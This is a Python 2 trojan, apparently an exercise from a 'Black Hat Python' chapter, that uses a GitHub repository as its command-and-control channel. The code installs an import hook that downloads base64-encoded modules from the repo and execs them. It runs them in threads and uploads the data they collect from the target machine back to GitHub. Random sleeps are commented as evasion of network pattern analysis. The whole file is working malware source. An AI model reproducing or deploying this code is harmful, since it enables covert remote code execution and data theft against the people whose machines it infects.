import json 
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

REPO_USERNAME = "myuser"
REPO_PASS = "mypass"
REPO_NAME = "blackhat-python"
BRANCH_NAME = "master"

from github3 import login

trojan_id = "abc"
relative_path = "chapter-7/trojan/"
trojan_config = "%s.json" % trojan_id
data_path = relative_path + "data/%s/" % trojan_id
trojan_modules = []
configured = False
task_queue = Queue.Queue()

# Authenticate to the repository
def connect_to_github():
    gh = login(username=REPO_USERNAME, password=REPO_PASS)
    # Retrieve the current repo
    repo = gh.repository(REPO_USERNAME,REPO_NAME)
    # Retrieve the current branch
    branch = repo.branch(BRANCH_NAME)
    return gh, repo, branch

# Grab files from the remote repo and read their contents in locally
def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in  tree.tree:
        if filepath in filename.path:
            print"[*] Found file %s" % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    return None

# Retrieve the remote configuration document from the repo
def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True
    
    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])

    return config

# Push any data that the malware collected on the target machine
def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = relative_path + "data/%s/%d.data" % (trojan_id,random.randint(1000,1000000))
    repo.create_file(remote_path,"Commit message",base64.b64encode(data))

    return

# Every time the interpreter attempts to load a module that isn't available 
# this class is used. 
# http://xion.org.pl/2012/05/06/hacking-python-imports/
class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    # That's the first function called in attempt to locate the module
    def find_module(self, fullname, path=None):
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            # We call our remote file loader get_file_contents()
            new_library = get_file_contents(relative_path + "modules/%s" % fullname)
            # If we locate the file in our repo, 
            # we base64-decode it and sotre it in our class
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                # By returning self we indicate to the Py Interpreter that
                # we found the module and it can thell call our load_module() function
                return self
        return None
    
    
    def load_module(self, name):
        # We create a new blank module object
        module = imp.new_module(name)
        # We insert the code we retrieved from GitHub into it
        exec self.current_module_code in module.__dict__
        # We insert our newly created module into the sys.modules so
        # it could be picked up in every future import
        sys.modules[name] = module

        return module


def module_runner(module):
    task_queue.put(1)
    # We simply call the module run function to kick off its code
    result = sys.modules[module].run()
    task_queue.get()

    # When the module finished running we should store the result in 
    # our repo
    store_module_result(result)

    return

# We make sure to load our custom module importer before beginning
# the main loop of our trojan
sys.meta_path = [GitImporter()]

# Main trojan loop
while True:
    if task_queue.empty():
        # We grab the configuration file from the repo
        config = get_trojan_config()

    for task in config:
        # We kick off the module giving it its own thread
        t = threading.Thread(target=module_runner,args=(task['module'],))
        t.start()
        time.sleep(random.randint(1,10))
    
    # Random sleeping time to foil any network pattern analysis
    # TODO: add some random Google traffic to increase the deception
    time.sleep(random.randint(1000,100000))



























